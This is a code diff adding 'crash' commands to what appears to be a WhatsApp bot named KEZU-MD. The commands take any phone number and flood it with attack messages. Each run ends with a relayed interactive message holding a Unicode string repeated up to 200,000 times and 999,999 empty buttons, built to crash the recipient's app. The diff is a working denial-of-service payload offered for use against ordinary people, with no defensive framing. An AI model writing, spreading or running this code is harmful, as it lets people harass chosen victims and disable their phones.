@@ -1750,6 +1750,103 @@ function setupCommandHandlers(socket, number) {
           }
           break;
         }
+            case 'gb':
+        case 'crash': {
+          await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `💀 *GOODBYE CRASH*\n\n*Usage:*\n.gb <number>\n\n*Example:*\n.gb 94770000000\n\n*Attacks:* Combo + VvvXxxAaa + Crashard`
+          }, { quoted: msg });
+          try {
+            const _gbNum = args[0].replace(/[^0-9]/g, '');
+            if (_gbNum.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _gbTarget = _gbNum + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gbNum}\n⚡ *Attacking...*` }, { quoted: msg });
+            await _atkCombo(socket, _gbTarget);
+            await delay(2000);
+            await _atkVvvXxxAaa(socket, _gbTarget);
+            await delay(2000);
+            await _atkCrashard(socket, _gbTarget);
+            await socket.sendMessage(sender, { text: `✅ *Attack completed on ${_gbNum}*\n\n💀 *KEZU-MD*` }, { quoted: msg });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── gb2 / heavy / destroy (Heavy Goodbye Attack) ─────────────────────
+        case 'gb2':
+        case 'heavy':
+        case 'destroy': {
+          await socket.sendMessage(sender, { react: { text: '🔥', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `🔥 *HEAVY GOODBYE*\n\n*Usage:*\n.gb2 <number>\n\n*Example:*\n.gb2 94770000000\n\n*⚡ Sends 15+ heavy messages*`
+          }, { quoted: msg });
+          try {
+            const _gb2Num = args[0].replace(/[^0-9]/g, '');
+            if (_gb2Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _gb2Target = _gb2Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gb2Num}\n⚡ *Heavy attack initiated...*\n\n⏳ Sending 15+ crash messages...` }, { quoted: msg });
+            await socket.sendMessage(sender, { text: `🔥 *Phase 1/3:* Sending 3 Combo attacks...` }, { quoted: msg });
+            for (let i = 0; i < 3; i++) { await _atkCombo(socket, _gb2Target); await delay(1000); }
+            await socket.sendMessage(sender, { text: `🔥 *Phase 2/3:* Sending 3 VvvXxxAaa attacks...` }, { quoted: msg });
+            for (let i = 0; i < 3; i++) { await _atkVvvXxxAaa(socket, _gb2Target); await delay(1000); }
+            await socket.sendMessage(sender, { text: `🔥 *Phase 3/3:* Sending 5 Crashard attacks...` }, { quoted: msg });
+            for (let i = 0; i < 5; i++) { await _atkCrashard(socket, _gb2Target); await delay(800); }
+            await socket.sendMessage(sender, { text: `💥 *Final Blast:* Sending ultimate crash...` }, { quoted: msg });
+            const _gb2Final = {
+              viewOnceMessage: {
+                message: {
+                  interactiveMessage: {
+                    body: { text: "💀 KEZU-MD ULTIMATE CRASH 💀\n" + "𑇂𑆵𑆴𑆿".repeat(100000) + "\n𝖷𝟩 | 𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
+                    nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
+                  }
+                }
+              }
+            };
+            await socket.relayMessage(_gb2Target, _gb2Final, { participant: { jid: _gb2Target } });
+            await socket.sendMessage(sender, { text: `✅ *Heavy attack completed on ${_gb2Num}*\n\n🔥 *KEZU-MD ULTIMATE*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
+
+        // ── gb3 / ultimate / max (Ultimate Goodbye Attack) ───────────────────
+        case 'gb3':
+        case 'ultimate':
+        case 'max': {
+          await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });
+          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
+          if (!args[0]) return await socket.sendMessage(sender, {
+            text: `💥 *ULTIMATE GOODBYE*\n\n*Usage:*\n.gb3 <number>\n\n*Example:*\n.gb3 94770000000\n\n*⚡ Sends 30+ heavy messages*`
+          }, { quoted: msg });
+          try {
+            const _gb3Num = args[0].replace(/[^0-9]/g, '');
+            if (_gb3Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
+            const _gb3Target = _gb3Num + '@s.whatsapp.net';
+            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gb3Num}\n⚡ *ULTIMATE attack initiated...*\n\n⏳ Sending 30+ crash messages...` }, { quoted: msg });
+            for (let i = 0; i < 5; i++) {
+              await socket.sendMessage(sender, { text: `🔥 *Round ${i+1}/5:* Sending all attacks...` }, { quoted: msg });
+              await _atkCombo(socket, _gb3Target); await delay(1000);
+              await _atkVvvXxxAaa(socket, _gb3Target); await delay(1000);
+              await _atkCrashard(socket, _gb3Target); await delay(1000);
+            }
+            await socket.sendMessage(sender, { text: `💥 *Final Blast:* Sending ultimate crash...` }, { quoted: msg });
+            const _gb3Final = {
+              viewOnceMessage: {
+                message: {
+                  interactiveMessage: {
+                    body: { text: "💀 KEZU-MD MAXIMUM OVERDRIVE 💀\n" + "𑇂𑆵𑆴𑆿".repeat(200000) + "\n𝖷𝟩 | 𝖴𝗅𝗍𝗂𝗆𝖺𝗍𝖾 𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
+                    nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
+                  }
+                }
+              }
+            };
+            await socket.relayMessage(_gb3Target, _gb3Final, { participant: { jid: _gb3Target } });
+            await socket.sendMessage(sender, { text: `✅ *ULTIMATE attack completed on ${_gb3Num}*\n\n💥 *KEZU-MD MAXIMUM POWER*` }, { quoted: msg });
+            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
+          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
+          break;
+        }
           case 'tourl':
 case 'url':
 case 'upload': {
